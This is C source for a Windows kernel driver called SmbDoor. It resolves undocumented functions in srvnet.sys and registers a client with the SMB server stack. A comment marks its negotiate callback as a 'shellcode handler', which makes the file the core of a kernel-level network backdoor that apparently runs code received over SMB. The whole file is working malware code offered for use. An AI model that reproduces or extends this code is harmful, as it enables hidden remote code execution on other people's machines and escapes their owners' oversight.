#include <ntddk.h>
#include "smbdoor.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text( PAGE, SmbDoorRegisterSrvNet )
#pragma alloc_text( PAGE, SmbDoorDeregisterSrvNet )
#endif

static HANDLE SrvNetHandle = NULL;
static SMBDOOR_SRVNET_ROUTINES Routines = { 0 };
static SMBDOOR_SRVNET_REGISTRATION ServerRegistration = { 0 };

NTSTATUS SmbDoorRegisterSrvNet(VOID)
{
	NTSTATUS status;

	PAGED_CODE();

	RtlInitUnicodeString(&ServerRegistration.ServerName, SMBDOOR_SRVNET_NAME);

	ServerRegistration.unknown0				=	0;
	ServerRegistration.fnRegisterEndpoint	=	&SmbDoorGenericCallback;
	ServerRegistration.fnDeregisterEndpoint =	&SmbDoorGenericCallback;

	ServerRegistration.fnNegotiateHandler	=	&SmbDoorNegotiateCallback; // shellcode handler
	
	ServerRegistration.fnConnectHandler		=	&SmbDoorGenericCallback;
	ServerRegistration.fnReceiveHandler		=	&SmbDoorGenericCallback;
	ServerRegistration.fnDisconnectHandler	=	&SmbDoorGenericCallback;
	ServerRegistration.fnUpdateNetnameTable	=	&SmbDoorGenericCallback;
	ServerRegistration.fnUnknownCallback1	=	&SmbDoorGenericCallback;
	ServerRegistration.Unknown2				=	3;

	do
	{
		// find functions
		if (!NT_SUCCESS(status = SmbDoorGetModuleByName("srvnet.sys", &Routines.SrvNetBase)))
			break;

		if (!NT_SUCCESS(status = SmbDoorGetRoutineByName(Routines.SrvNetBase, "SrvNetRegisterClient", (PVOID*)&Routines.SrvNetRegisterClient)))
			break;

		if (!NT_SUCCESS(status = SmbDoorGetRoutineByName(Routines.SrvNetBase, "SrvNetStartClient", (PVOID*)&Routines.SrvNetStartClient)))
			break;

		if (!NT_SUCCESS(status = SmbDoorGetRoutineByName(Routines.SrvNetBase, "SrvNetStopClient", (PVOID*)&Routines.SrvNetStopClient)))
			break;

		if (!NT_SUCCESS(status = SmbDoorGetRoutineByName(Routines.SrvNetBase, "SrvNetDeregisterClient", (PVOID*)&Routines.SrvNetDeregisterClient)))
			break;

		// register client
		if (!NT_SUCCESS(status = Routines.SrvNetRegisterClient(&ServerRegistration, &SrvNetHandle)))
			break;

		if (!NT_SUCCESS(status = Routines.SrvNetStartClient(SrvNetHandle)))
			break;

	} while (0);

	return status;
}

VOID SmbDoorDeregisterSrvNet(VOID)
{
	PAGED_CODE();

	if (SrvNetHandle != NULL)
	{
		Routines.SrvNetStopClient(SrvNetHandle);
		Routines.SrvNetDeregisterClient(SrvNetHandle);
	}
}